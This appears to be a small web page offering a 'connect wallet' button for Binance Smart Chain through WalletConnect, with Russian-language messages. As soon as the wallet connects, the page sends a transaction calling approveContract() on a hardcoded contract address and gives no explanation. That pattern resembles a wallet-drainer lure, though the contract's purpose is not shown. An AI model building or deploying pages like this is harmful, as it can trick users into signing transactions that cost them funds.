<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WalletConnect Integration</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #1f1f1f;
            color: white;
            text-align: center;
        }

        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
        }

        #status {
            margin-top: 20px;
            font-weight: bold;
            color: green;
        }

        #error {
            margin-top: 20px;
            font-weight: bold;
            color: red;
        }
    </style>
</head>
<body>
    <div id="app">
        <h1>WalletConnect Integration</h1>
        <button onclick="connectWallet()">Подключить кошелек</button>
        <div id="status"></div>
        <div id="error"></div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider/dist/umd/index.min.js"></script>

    <script>
        async function connectWallet() {
            try {
                const provider = new WalletConnectProvider.default({
                    rpc: {
                        56: "https://bsc-dataseed.binance.org/" // Binance Smart Chain
                    },
                });

                // Включаем WalletConnect
                await provider.enable();

                // Создаем провайдер для ethers.js
                const web3Provider = new ethers.providers.Web3Provider(provider);

                // Получаем адрес пользователя
                const signer = web3Provider.getSigner();
                const userAddress = await signer.getAddress();

                document.getElementById("status").innerText = `Кошелек подключен: ${userAddress}`;

                // Подписание контракта
                await signContract(web3Provider);

            } catch (error) {
                document.getElementById("error").innerText = `Ошибка: ${error.message}`;
            }
        }

        async function signContract(provider) {
            const signer = provider.getSigner();
            const contractAbi = [
                "function approveContract() external"
            ];
            const contractAddress = "0xfe0d3ab9a7ab9c070069f516feda0f351751944e";
            const contract = new ethers.Contract(contractAddress, contractAbi, signer);

            const tx = await contract.approveContract();
            console.log("Контракт подписан. Транзакция:", tx.hash);
            await tx.wait();
            document.getElementById("status").innerText = "Контракт успешно подписан.";
        }
    </script>
</body>
</html>
